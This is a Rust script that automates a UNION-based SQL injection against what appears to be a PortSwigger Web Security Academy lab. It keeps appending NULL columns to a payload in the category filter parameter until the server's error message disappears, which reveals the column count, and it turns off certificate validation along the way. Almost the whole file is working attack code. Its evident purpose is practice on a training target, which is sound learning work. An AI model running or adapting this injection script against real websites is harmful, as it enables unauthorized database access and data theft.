use reqwest::Client;
use scraper::{Html,ElementRef,Selector};
use std::error::Error;

fn check_internal_server_error(html_text: &str) -> bool {
    let document = Html::parse_document(html_text);
    let sel = Selector::parse(r#"p[class="is-warning"]"#).unwrap();
    let text = document
        .select(&sel)
        .next()
        .map(|el| el.text().collect::<Vec<_>>().join(" ").trim().to_string());

    match text {
        Some(ref t) if t == "Internal Server Error" => false,
        Some(_) => true,
        None => true,
    }
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn Error>> {
    let host = "https://0a8c004c04a412b4838282a600b10062.web-security-academy.net";
    let client = Client::builder()
        .danger_accept_invalid_certs(true)
        .cookie_store(true)
        .build()?;

    let product_url = format!("{}/filter?category=", host);
    let null_value = "null";
    let comment = "--";
    let mut malicious_payload = format!("{}'UNION select {}", product_url, null_value);
    let comma = ",";
    let mut i = false;
    let mut counter=0;

    while i == false {
        let resp_text = client
            .get(format!("{}{}", malicious_payload, comment))
            .send()
            .await?
            .text()
            .await?;
        let answer = check_internal_server_error(&resp_text);
        println!("executed payload: {} ", format!("{}{}", malicious_payload, comment));

        if answer == false {
            malicious_payload = malicious_payload + comma + null_value;
            counter+=1;
        } else {
            i = true;
        }
    }
    if check_internal_server_error(&client
            .get(format!("{}{}", malicious_payload, comment))
            .send()
            .await?
            .text()
            .await?)==true{
            println!("[+] Lab Solved LESSGOOOOO");
        }
        else{
            println!("Try harder noob!");
        }
 Ok(())
}
